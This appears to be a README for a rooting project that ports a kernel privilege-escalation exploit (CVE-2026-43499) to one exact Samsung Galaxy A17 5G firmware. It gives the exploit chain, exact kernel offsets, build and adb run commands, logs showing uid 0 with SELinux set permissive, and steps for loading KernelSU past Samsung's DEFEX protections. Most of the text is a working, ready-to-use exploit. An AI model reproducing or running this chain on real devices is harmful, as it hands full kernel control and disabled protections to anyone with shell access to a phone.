# Galaxy A17 5G SM-A176U1 / A176U1UES5AZD2 experimental port

## Status

The MCAST payload completed the full root chain on real `SM-A176U1` hardware
running `A176U1UES5AZD2` (Android 16, kernel `5.15.180-android13-3-32407857`).
This is one confirmed hardware success with the published pair, not a
reliability claim. The first attempt of the same pair panicked at the
PI/MCAST stage; the second clean-boot attempt completed the chain.

The exact successful chain was:

```text
adb shell
-> tracefs KASLR slide
-> KernelSnitch mm_struct leak
-> order-3 SKB reclaim
-> MCAST stale waiter write
-> fake ashmem fops
-> configfs arbitrary read/write
-> pipe physical read/write
-> workqueue usermode helper
-> uid 0 root daemon
```

The root client returned:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

The phone stayed up and the bootloader state was unchanged after root:

```text
ro.boot.warranty_bit=0
ro.boot.flash.locked=1
ro.boot.verifiedbootstate=green
```

## Exact target

| Field | Value |
| --- | --- |
| Model | `SM-A176U1` Galaxy A17 5G |
| Device | `a17x` |
| SoC | Exynos 1330 (`erd8535` / `s5e8535`) |
| Firmware | `A176U1UES5AZD2` (CSC `OYM5AZD2`) |
| Build display | `BP2A.250605.031.A3.A176U1UES5AZD2` |
| Fingerprint | `samsung/a17xue/a17x:16/BP2A.250605.031.A3/A176U1UES5AZD2_OYM5AZD2:user/release-keys` |
| Kernel | `5.15.180-android13-3-32407857` |
| Android / SDK | 16 / 36 |
| Bootloader | `A176USQS5AZD2`, locked, nothing flashed |
| Payload profile | `a17x-A176U1UES5AZD2` |
| Proven writer | MCAST |
| Proven execution domain | `uid=2000`, `u:r:shell:s0` |

The profile is exact-firmware bound. Do not use it on a nearby A17 build or
another Exynos 1330 model without re-deriving the offsets and P0 fingerprint.

## APK and shell boundary

The successful payload uses tracefs to obtain the exact KASLR slide. That path
is available to the tested ADB shell domain but not to a normal Android
application domain.

The payload is therefore intentionally absent from `support/targets-v3.json`.
Current Root My Galaxy automatic APK execution must not select it. An APK
frontend could invoke the same runner through Shizuku or another authorized
shell bridge, but direct app-domain use has not been implemented or validated.

No KernelSU module is included. This profile provides a temporary soft root
only; it does not install a persistent KernelSU.

## Device-specific values

The profile follows the `dm2q`/`dm3q` 5.15 layout family, with the A17's own
offsets and P0 fingerprint:

| Value | Offset / setting |
| --- | --- |
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` |
| `P0_PHYS_OFFSET` / `P0_KERNEL_PHYS_LOAD` | `0x80000000` / `0x80000000` |
| `task_struct.cred` / `real_cred` | `0x798` / `0x790` |
| `task_struct.sched_task_group` | `0x400` |
| `task_struct.pi_lock` | `0x884` |
| `mm_struct` size / slab order | `0x3e0` / 3 |
| `SELINUX_ENFORCING_OFF` | `0x025c7f40` (`enforcing` at `+0`) |
| `INIT_TASK_OFF` / `ROOT_TASK_GROUP_OFF` | `0x0230fc40` / `0x024f4f40` |
| `MCAST_WAITER_OFF` | `0x98` |
| `SKB_DATA_DELTA` | `-0xe80` |
| Tracefs event / worker / vfork caller | `108` / `0x00108a90` / `0x000d966c` |
| P0 probe offset / gate object index | `0x1f0000` / 1 |
| Slide candidates | `0x0`-`0x1f0000`, step `0x10000` |

The P0 fingerprint table was generated from this firmware's raw kernel Image.
The `MCAST_WAITER_OFF=0x98` value was verified instruction-by-instruction
against the A17 `vmlinux` (futex syscall frame minus the `do_ipv6_setsockopt`
frame). `SKB_DATA_DELTA=-0xe80` is the `SKB_MAX_HEAD(0)` linear-head length for
the 0x8e80-byte send, so the reclaimed order-3 fragment page starts at payload
offset `0xe80`.

## Build

```sh
make TARGET=a17x-A176U1UES5AZD2 ANDROID_NDK_HOME=/path/to/android-ndk
```

Outputs:

```text
build/a17x-A176U1UES5AZD2/cve-2026-43499-app.so
build/a17x-A176U1UES5AZD2/cve-2026-43499-root
```

The published pair was built from this branch with the Android NDK r29
(API 35 clang). See
[`../artifacts/a17x-A176U1UES5AZD2/README.md`](../artifacts/a17x-A176U1UES5AZD2/README.md)
for the exact hashes, build command, and ADB test.

## ADB shell test

Wait about one minute after boot, then push the payload and runner:

```sh
adb push cve-2026-43499-app.so /data/local/tmp/a17x.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 644 /data/local/tmp/a17x.so
adb shell chmod 755 /data/local/tmp/cve-2026-43499-root
```

Run one attempt:

```sh
adb shell "nohup env SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 \
  P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=5400 \
  /data/local/tmp/cve-2026-43499-root \
  --run-payload /data/local/tmp/a17x.so \
  /data/local/tmp/cve-2026-43499-root \
  /data/local/tmp/a17x.log >/dev/null 2>&1 &"
```

Verify root with the same helper:

```sh
adb shell '/data/local/tmp/cve-2026-43499-root -c "id; getenforce"'
```

Expected:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

## Verification record

2026-10-23, exact device, published pair, clean boot, attempt 2:

```text
[+] slide-kaslr-ok source=tracefs pid=5326 base=ffffffc008160000 slide=0000000000160000 data_mode=canonical
[*] mm leaked=ffffff804576fc00 base=ffffff8045768000 object_index=32
[*] root umh result wake=1 complete=1 retval=0 socket=1
[*] root umh selinux left=0 intended root state old=1
[+] pipe-physrw-summary pid=5326 done=1 root=1 kaslr=1 base=ffffffc008160000 slide=0000000000160000
[+] pipe physrw pid=5326 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/1
```

Attempt 1 of the same pair stopped at the PI/MCAST stage and the phone
rebooted. That failure mode is documented below.

## Reliability and limitations

- The exploit is probabilistic. The fops page leak needed 10 inner attempts
  in the successful run; an earlier local run needed 20, and the physrw pipe
  leak needed 37. A bad heap layout can panic the kernel at the PI/MCAST
  stage, which reboots the phone.
- Root is per boot. A reboot clears it; the bootloader stays locked and no
  partition is modified.
- The tested launch context is `adb shell` (`uid=2000`, `u:r:shell:s0`).
  Direct app-domain execution is not supported by the tracefs route.
- Do not rerun the exploit while root is live, and do not kill the parked
  slide child or stability keeper; reboot is the safe cleanup.

## KernelSU

A KernelSU LKM built for this exact target is published with the profile and
loaded on top of the payload's root:

```text
kernelsu/android13-5.15_kernelsu-a17x-A176U1UES5AZD2-ksu331.ko
size: 390712
SHA-256: 97cda22acd04989ab677031f562e3bb80be0732191e6b944942728022bcef7c1

kernelsu/ksud-a17x-A176U1UES5AZD2-ksu331
size: 5133632
SHA-256: cf0d0ae003640b509f605b8e290bd02902ac1dfdb5053dc58fb74b7a7c9d56a5
```

It is KernelSU v3.3.1 (kernel version 32680, UAPI 5), which is what makes it
pair with the v3.3.1 Manager: the Manager requires
`kernelUAPIVersion == managerUAPIVersion` and silently runs in a reduced state
otherwise. The Samsung KDP/RKP/DEFEX work is rebased onto that tag by
[`kernelsu/patches/KernelSU-v3.3.1-samsung-kdp-rkp-defex-a17x.patch`](../kernelsu/patches/KernelSU-v3.3.1-samsung-kdp-rkp-defex-a17x.patch),
and `CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y` keeps live text patching off, because
RKP rejects writes to kernel text and the syscall table in EL2 on this device.
The module therefore installs its fallback: a `__arm64_sys_setresuid` kretprobe
for Manager FD delivery plus the sucompat syscall kprobes.

Load it from a boot that already has the payload's root:

```sh
adb push ksud-a17x-A176U1UES5AZD2-ksu331 /data/local/tmp/ksud-s25u-kdp
adb shell chmod 755 /data/local/tmp/ksud-s25u-kdp     # path is fixed in su_daemon.c
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```

The helper's guarded `--late-load` runs the loader in a private mount namespace
with the loader bind-mounted over `/system/bin/logcat`, because Samsung DEFEX
blocks executing a file from `/data/local/tmp` from a privileged task (a direct
`ksud late-load` prints only `Killed`). Start it from an adb shell, not from a
root context — the client is executed by adbd and only the daemon runs
privileged. It is silent on success.

Expected state afterwards:

```text
$ adb shell grep kernelsu /proc/modules
kernelsu 241664 0 - Live 0x0000000000000000 (OE)
$ adb shell getenforce
Enforcing
```

Measured on the exact device, 2026-10-24, from `Permissive` with no `kernelsu`
in `/proc/modules`. The `RC=0` matters: the helper only returns 0 after
`verify_kernelsu_control()` opens the KernelSU control fd through the
`reboot(0xDEADBEEF, 0xCAFEBABE, …)` magic and reads a non-zero version, so the
kernel side answered. `/sys/module/kernelsu` does not exist on purpose — the
module deletes its own kobject at the end of init.

Install the matching Manager and open it:

```sh
adb install KernelSU_v3.3.1_32680-release.apk     # versionCode 32680
adb shell am start -n me.weishu.kernelsu/.ui.MainActivity
```

Status: `Working <LKM>` / `[Jailbreak mode]` / `Version: 32680-5` with SELinux
`Enforcing` (screenshot:
[`SM-A176U1-A176U1UES5AZD2-KernelSU.png`](SM-A176U1-A176U1UES5AZD2-KernelSU.png)).
The app is genuinely talking to the module — `/proc/modules` goes `0` → `1`
while it is open, because the app holds the driver fd.

Limitations: the load is per boot (a reboot clears the module), it needs the
payload's root first, and it closes the payload's own su channel for the rest of
the boot, because the module replaces the SELinux policy and calls
`setenforce(true)` — the shell no longer reaches `/data/local/tmp/temp_su.sock`.
`--ephemeral` deliberately skips the `/data/adb` installation, so the Manager
runs without the ksud daemon and daemon-backed features (module install, and so
on) are out of scope here.

## Artifacts and commands

See
[`../artifacts/a17x-A176U1UES5AZD2/README.md`](../artifacts/a17x-A176U1UES5AZD2/README.md)
for file hashes, the exact build command, the ADB shell invocation, root
verification, and the known limitations.

## Authorship and acknowledgments

This profile and report were prepared in OpenCode with DeepSeek V4.1 Flash
(target constants, source packaging, and documentation). Hardware execution
and verification were performed by the device owner on the exact device.

Thanks to the Root My Galaxy maintainers and to the authors of the
CVE-2026-43499 exploit source (NebuSec / CyberMeowfia).
